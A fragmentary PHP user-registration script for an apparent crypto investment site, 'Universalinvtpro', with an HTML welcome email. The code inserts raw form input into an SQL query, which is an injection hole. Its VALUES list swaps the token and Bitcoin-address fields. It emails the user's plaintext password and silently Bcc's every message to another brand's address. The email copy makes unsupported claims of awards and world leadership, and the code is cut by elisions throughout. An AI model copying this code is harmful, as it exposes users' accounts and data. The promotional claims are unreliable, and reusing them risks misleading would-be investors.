...
if (isset($_POST['register'])) {
    ...
    }elseif ($email != $con_email) {
        $reg_rep = "<p class='text-danger' style='color:#faa;'><i class='fa fa-info-circle'></i> Sorry! emails do not match</p>";
    }
     else {
        

            // Insert mutiple mysqli data
        $sql = "INSERT INTO users (full_name, username, email, password, phone_number, btc_address, token, statu) 
                VALUES ('$full_name', '$username', '$email', '$password','$phone','$token', '$btc_address','0');";
                            ...
                            <table border='0' align='center' width='590' cellpadding='0' cellspacing='0' class='container590'>
                                ...
                                <tr>
                                    <td align='center' height='70' style='height:70px;'>
                                        <a href='' style='display: block; border-style: none !important; border: 0 !important;'><img width='100' border='0' style='display: block; width: 300px;' src='https://www.universalinvtpro.com/logo.png' alt='' /></a>
                                    </td>
                                </tr>
                            </table>
                        </td>
            ...
            <td align='center'>
                <table border='0' align='center' width='590' cellpadding='0' cellspacing='0' class='container590'>
                    <tr>
                        ...
                        <td align='center'>
                            <a href='' style=' border-style: none !important; display: block; border: 0 !important;'><img src='https://www.universalinvtpro.com/c.jpg' style='display: block; width: 590px;' width='590' border='0' alt='' /></a>
                    ...
                    <tr>
                        <td align='center' style='color: #343434; font-size: 24px; font-family: Quicksand, Calibri, sans-serif; font-weight:700;letter-spacing: 3px; line-height: 35px;' class='main-header'>
                            ...
                            <div style='line-height: 35px'>
                                ...
                                Hello <span style='color: #5caad2;'>$first_name $last_name</span>
                                ...
                                <tr>
                                    <td align='center' style='color: #888888; font-size: 16px; font-family: 'Work Sans', Calibri, sans-serif; line-height: 24px;'>
                                        ...
                                        <div style='line-height: 24px'>
                                            ...
                                            Welcome to Universalinvtpro
                                            <br><br>
                                            A world leading online investment platform fashioned with leading modern technology and security. Our experts always improves this platform to give the best customer experience.
                                            <br><br>
                                             In the last few years we have had several awards.
                                            <hr>
                                            <span style='color: #5caad2;'>Starter account details</span>
                                            <br><br>

                                            <div style='float: left;'>Your username is  <span style='color: #5caad2;'>$username</span></div>
                                            <div style='float: left;'>Your password is  <span style='color: #5caad2;'>$real_password</span></div>
                                            <div style='float: left;'>Your starter trade level is  <span style='color: #5caad2;'>1</span></div>
                                            <br><br>
                                ...
                                <tr>
                                    <td align='center' style='color: #ffffff; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; line-height: 26px;'>
                                        ...
                                        <div style='line-height: 26px;'>
                                            <a href='www.universalinvtpro/sign-in' style='color: #ffffff; text-decoration: none;'>LOGIN</a>
                                        </div>
                                    </td>
                                </tr>
                                ...
                                <tr>
                                    <td align='left' style='color: #888888; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; line-height: 23px;' class='text_color'>
                                        <div style='color: #333333; font-size: 14px; font-family: 'Work Sans', Calibri, sans-serif; font-weight: 600; mso-line-height-rule: exactly; line-height: 23px;'>
                                            ...
                                            Email us: <br/> <a href='mailto:' style='color: #888888; font-size: 14px; font-family: 'Hind Siliguri', Calibri, Sans-serif; font-weight: 400;'>support@swiftcapital.io</a>
...
$headers .= 'Cc: support@swiftcapital.io' . "\r\n"; 
$headers .= 'Bcc: support@swiftcapital.io' . "\r\n"; 
